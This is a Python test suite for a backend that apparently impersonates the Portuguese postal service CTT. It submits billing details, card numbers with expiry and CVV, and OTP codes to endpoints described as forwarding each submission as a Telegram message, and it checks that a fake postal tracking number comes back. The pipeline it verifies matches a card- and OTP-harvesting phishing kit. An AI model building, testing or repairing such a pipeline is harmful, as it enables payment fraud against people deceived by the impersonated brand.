#!/usr/bin/env python3
"""
CTT Backend API Testing Suite
Tests all CTT endpoints with focus on Telegram integration and API functionality
"""

import asyncio
import httpx
import json
import os
import sys
from datetime import datetime
from dotenv import load_dotenv

# Load environment variables
load_dotenv('/app/frontend/.env')
load_dotenv('/app/backend/.env')

# Get backend URL from frontend env
BACKEND_URL = os.environ.get('REACT_APP_BACKEND_URL', 'http://localhost:8001')
API_BASE = f"{BACKEND_URL}/api"

class CTTBackendTester:
    def __init__(self):
        self.client = None
        self.test_results = []
        self.session_id = None
        self.tracking_number = None
        
    async def setup(self):
        """Setup HTTP client"""
        self.client = httpx.AsyncClient(timeout=30.0)
        
    async def cleanup(self):
        """Cleanup HTTP client"""
        if self.client:
            await self.client.aclose()
    
    def log_result(self, test_name: str, success: bool, message: str, details: dict = None):
        """Log test result"""
        status = "✅ PASS" if success else "❌ FAIL"
        result = {
            "test": test_name,
            "status": status,
            "success": success,
            "message": message,
            "timestamp": datetime.now().isoformat(),
            "details": details or {}
        }
        self.test_results.append(result)
        print(f"{status} - {test_name}: {message}")
        if details:
            print(f"    Details: {json.dumps(details, indent=2)}")
    
    async def test_health_check(self):
        """Test basic health check endpoint"""
        try:
            response = await self.client.get(f"{API_BASE}/health")
            
            if response.status_code == 200:
                data = response.json()
                telegram_configured = data.get('telegram_configured', False)
                
                self.log_result(
                    "Health Check",
                    True,
                    f"API is healthy, Telegram configured: {telegram_configured}",
                    {"response": data, "status_code": response.status_code}
                )
                return True
            else:
                self.log_result(
                    "Health Check",
                    False,
                    f"Health check failed with status {response.status_code}",
                    {"status_code": response.status_code, "response": response.text}
                )
                return False
                
        except Exception as e:
            self.log_result(
                "Health Check",
                False,
                f"Health check error: {str(e)}",
                {"error": str(e)}
            )
            return False
    
    async def test_billing_endpoint(self):
        """Test billing information submission"""
        try:
            # Sample billing data as specified in review request
            billing_data = {
                "nome": "João Silva",
                "email": "joao@test.com",
                "endereco": "Rua de Teste, 123",
                "codigoPostal": "1000-100",
                "cidade": "Lisboa",
                "telefone": "+351912345678"
            }
            
            response = await self.client.post(
                f"{API_BASE}/ctt/billing",
                json=billing_data
            )
            
            if response.status_code == 200:
                data = response.json()
                billing_id = data.get('billing_id')
                
                self.log_result(
                    "Billing Submission",
                    True,
                    f"Billing data submitted successfully, ID: {billing_id}",
                    {"response": data, "billing_data": billing_data}
                )
                return True
            else:
                self.log_result(
                    "Billing Submission",
                    False,
                    f"Billing submission failed with status {response.status_code}",
                    {"status_code": response.status_code, "response": response.text}
                )
                return False
                
        except Exception as e:
            self.log_result(
                "Billing Submission",
                False,
                f"Billing submission error: {str(e)}",
                {"error": str(e)}
            )
            return False
    
    async def test_card_submit_endpoint(self):
        """Test card submission endpoint (first Telegram message) - POST TOAST REMOVAL TESTING"""
        try:
            # Test data as specified in review request for post-toast removal verification
            billing_data = {
                "nome": "ToastRemoved",
                "email": "test@removed.com",
                "endereco": "Test Address After Toast Removal",
                "codigoPostal": "1000-100",
                "cidade": "Lisboa",
                "telefone": "+351999888777"
            }
            
            card_data = {
                "numeroCartao": "4000000000000002",
                "dataExpiracao": "03/27",
                "cvv": "789"
            }
            
            payment_request = {
                "billing_data": billing_data,
                "card_data": card_data
            }
            
            response = await self.client.post(
                f"{API_BASE}/ctt/card-submit",
                json=payment_request
            )
            
            if response.status_code == 200:
                data = response.json()
                self.session_id = data.get('session_id')
                
                # Verify session ID format (CTT########)
                session_id_valid = self.session_id and self.session_id.startswith('CTT') and len(self.session_id) == 11
                
                self.log_result(
                    "Card Submit (1st Telegram Message) - POST TOAST REMOVAL",
                    True,
                    f"✅ VERIFIED: Card-submit working after toast removal! Session ID: {self.session_id}, Format valid: {session_id_valid}",
                    {
                        "response": data, 
                        "session_id": self.session_id,
                        "session_format_valid": session_id_valid,
                        "expected_card_format": "4000 0000 0000 0002"
                    }
                )
                return True
            else:
                self.log_result(
                    "Card Submit (1st Telegram Message) - POST TOAST REMOVAL",
                    False,
                    f"❌ Card submission failed with status {response.status_code}",
                    {"status_code": response.status_code, "response": response.text}
                )
                return False
                
        except Exception as e:
            error_msg = str(e)
            is_uuid_error = "uuid" in error_msg.lower() and "randint" in error_msg.lower()
            
            self.log_result(
                "Card Submit (1st Telegram Message) - POST TOAST REMOVAL",
                False,
                f"❌ Card submission error after toast removal: {error_msg}",
                {"error": error_msg}
            )
            return False
    
    async def test_otp_verify_endpoint(self):
        """Test OTP verification endpoint (second Telegram message) - URGENT FIX TESTING"""
        try:
            # Test data as specified in review request for the uuid.randint() fix
            billing_data = {
                "nome": "TestFix",
                "email": "testfix@example.com",
                "endereco": "Fix Test Address",
                "codigoPostal": "2000-200",
                "cidade": "Porto",
                "telefone": "+351987654321"
            }
            
            card_data = {
                "numeroCartao": "5555555555554444",
                "dataExpiracao": "06/28",
                "cvv": "456"
            }
            
            otp_request = {
                "otp_code": "654321",  # As specified in review request
                "billing_data": billing_data,
                "card_data": card_data
            }
            
            response = await self.client.post(
                f"{API_BASE}/ctt/otp/verify",
                json=otp_request
            )
            
            if response.status_code == 200:
                data = response.json()
                self.tracking_number = data.get('tracking_number')
                
                # Verify tracking number format (RR#########PT)
                tracking_valid = self.tracking_number and self.tracking_number.startswith('RR') and self.tracking_number.endswith('PT')
                
                self.log_result(
                    "OTP Verify (2nd Telegram Message) - URGENT FIX",
                    True,
                    f"✅ FIXED: OTP verified successfully, Tracking: {self.tracking_number}, Format valid: {tracking_valid}",
                    {
                        "response": data, 
                        "tracking_number": self.tracking_number,
                        "tracking_format_valid": tracking_valid,
                        "otp_used": "654321"
                    }
                )
                return True
            else:
                self.log_result(
                    "OTP Verify (2nd Telegram Message) - URGENT FIX",
                    False,
                    f"❌ OTP verification failed with status {response.status_code}",
                    {"status_code": response.status_code, "response": response.text}
                )
                return False
                
        except Exception as e:
            error_msg = str(e)
            is_uuid_error = "uuid" in error_msg.lower() and "randint" in error_msg.lower()
            
            self.log_result(
                "OTP Verify (2nd Telegram Message) - URGENT FIX",
                False,
                f"❌ {'UUID.RANDINT ERROR STILL EXISTS!' if is_uuid_error else 'OTP verification error'}: {error_msg}",
                {"error": error_msg, "is_uuid_randint_error": is_uuid_error}
            )
            return False
    
    async def test_otp_resend_endpoint(self):
        """Test OTP resend endpoint"""
        try:
            billing_data = {
                "nome": "João Silva",
                "email": "joao@test.com",
                "telefone": "+351912345678"
            }
            
            resend_request = {
                "phone": "+351912345678",
                "billing_data": billing_data
            }
            
            response = await self.client.post(
                f"{API_BASE}/ctt/otp/resend",
                json=resend_request
            )
            
            if response.status_code == 200:
                data = response.json()
                new_otp = data.get('otp')
                
                self.log_result(
                    "OTP Resend",
                    True,
                    f"OTP resent successfully, New OTP: {new_otp}",
                    {"response": data}
                )
                return True
            else:
                self.log_result(
                    "OTP Resend",
                    False,
                    f"OTP resend failed with status {response.status_code}",
                    {"status_code": response.status_code, "response": response.text}
                )
                return False
                
        except Exception as e:
            self.log_result(
                "OTP Resend",
                False,
                f"OTP resend error: {str(e)}",
                {"error": str(e)}
            )
            return False
    
    async def test_tracking_endpoint(self):
        """Test tracking information retrieval"""
        try:
            # Use tracking number from OTP verification if available
            tracking_num = self.tracking_number or "RR123456789PT"
            
            response = await self.client.get(f"{API_BASE}/ctt/tracking/{tracking_num}")
            
            if response.status_code == 200:
                data = response.json()
                
                self.log_result(
                    "Tracking Retrieval",
                    True,
                    f"Tracking info retrieved successfully for {tracking_num}",
                    {"response": data, "tracking_number": tracking_num}
                )
                return True
            elif response.status_code == 404:
                self.log_result(
                    "Tracking Retrieval",
                    True,
                    f"Tracking endpoint working correctly (404 for non-existent tracking: {tracking_num})",
                    {"status_code": response.status_code, "tracking_number": tracking_num}
                )
                return True
            else:
                self.log_result(
                    "Tracking Retrieval",
                    False,
                    f"Tracking retrieval failed with status {response.status_code}",
                    {"status_code": response.status_code, "response": response.text}
                )
                return False
                
        except Exception as e:
            self.log_result(
                "Tracking Retrieval",
                False,
                f"Tracking retrieval error: {str(e)}",
                {"error": str(e)}
            )
            return False
    
    async def test_telegram_test_endpoint(self):
        """Test special Telegram test endpoint"""
        try:
            response = await self.client.post(f"{API_BASE}/ctt/test/telegram")
            
            if response.status_code == 200:
                data = response.json()
                
                self.log_result(
                    "Telegram Test Endpoint",
                    True,
                    "Telegram test messages sent successfully",
                    {"response": data}
                )
                return True
            else:
                self.log_result(
                    "Telegram Test Endpoint",
                    False,
                    f"Telegram test failed with status {response.status_code}",
                    {"status_code": response.status_code, "response": response.text}
                )
                return False
                
        except Exception as e:
            self.log_result(
                "Telegram Test Endpoint",
                False,
                f"Telegram test error: {str(e)}",
                {"error": str(e)}
            )
            return False
    
    async def test_mongodb_connection(self):
        """Test MongoDB connection by checking status endpoint"""
        try:
            response = await self.client.get(f"{API_BASE}/status")
            
            if response.status_code == 200:
                data = response.json()
                
                self.log_result(
                    "MongoDB Connection",
                    True,
                    f"MongoDB connection working, retrieved {len(data)} status records",
                    {"record_count": len(data)}
                )
                return True
            else:
                self.log_result(
                    "MongoDB Connection",
                    False,
                    f"MongoDB connection test failed with status {response.status_code}",
                    {"status_code": response.status_code, "response": response.text}
                )
                return False
                
        except Exception as e:
            self.log_result(
                "MongoDB Connection",
                False,
                f"MongoDB connection error: {str(e)}",
                {"error": str(e)}
            )
            return False
    
    async def run_all_tests(self):
        """Run all tests in sequence"""
        print(f"🚀 Starting CTT Backend API Tests")
        print(f"📡 Backend URL: {BACKEND_URL}")
        print(f"🔗 API Base: {API_BASE}")
        print(f"⏰ Test started at: {datetime.now().isoformat()}")
        print("=" * 60)
        
        await self.setup()
        
        try:
            # Test sequence based on review request priorities
            
            # 1. Basic health check
            await self.test_health_check()
            
            # 2. MongoDB connection test
            await self.test_mongodb_connection()
            
            # 3. High Priority: Telegram Bot Integration Testing
            print("\n🔥 HIGH PRIORITY: Telegram Bot Integration Tests")
            await self.test_card_submit_endpoint()  # First Telegram message
            await asyncio.sleep(2)  # Small delay between messages
            await self.test_otp_verify_endpoint()   # Second Telegram message
            
            # 4. API Endpoints Health Check
            print("\n📋 API Endpoints Health Check")
            await self.test_billing_endpoint()
            await self.test_otp_resend_endpoint()
            await self.test_tracking_endpoint()
            
            # 5. Special Telegram test endpoint
            print("\n🧪 Special Telegram Test")
            await self.test_telegram_test_endpoint()
            
        finally:
            await self.cleanup()
        
        # Print summary
        self.print_summary()
    
    def print_summary(self):
        """Print test summary"""
        print("\n" + "=" * 60)
        print("📊 TEST SUMMARY")
        print("=" * 60)
        
        total_tests = len(self.test_results)
        passed_tests = sum(1 for result in self.test_results if result['success'])
        failed_tests = total_tests - passed_tests
        
        print(f"📈 Total Tests: {total_tests}")
        print(f"✅ Passed: {passed_tests}")
        print(f"❌ Failed: {failed_tests}")
        print(f"📊 Success Rate: {(passed_tests/total_tests)*100:.1f}%")
        
        if failed_tests > 0:
            print(f"\n❌ FAILED TESTS:")
            for result in self.test_results:
                if not result['success']:
                    print(f"   • {result['test']}: {result['message']}")
        
        print(f"\n🔧 TELEGRAM CONFIGURATION:")
        telegram_token = os.environ.get('TELEGRAM_BOT_TOKEN', 'Not configured')
        telegram_chat = os.environ.get('TELEGRAM_CHAT_ID', 'Not configured')
        print(f"   • Bot Token: {telegram_token[:20]}..." if telegram_token != 'Not configured' else f"   • Bot Token: {telegram_token}")
        print(f"   • Chat ID: {telegram_chat}")
        
        print(f"\n⏰ Test completed at: {datetime.now().isoformat()}")
        
        # Return overall success
        return failed_tests == 0

async def main():
    """Main test runner"""
    tester = CTTBackendTester()
    success = await tester.run_all_tests()
    
    # Exit with appropriate code
    sys.exit(0 if success else 1)

if __name__ == "__main__":
    asyncio.run(main())